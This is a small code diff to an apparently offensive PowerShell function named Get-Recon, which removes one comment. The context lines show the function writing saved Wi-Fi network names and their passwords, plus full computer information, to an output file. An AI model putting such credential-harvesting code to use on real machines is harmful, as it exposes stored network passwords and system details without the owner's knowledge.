@@ -56,7 +56,6 @@ function Get-Recon {
                 "SSID: $($_.ProfileName), Password: $($_.ProfilePassword)" | Out-File -FilePath $outputFile -Append
             }
 
-            # Run Get-ComputerInfo and append its output to the file
             "Computer Information:" | Out-File -FilePath $outputFile -Append
             Get-ComputerInfo | Out-File -FilePath $outputFile -Append
         }
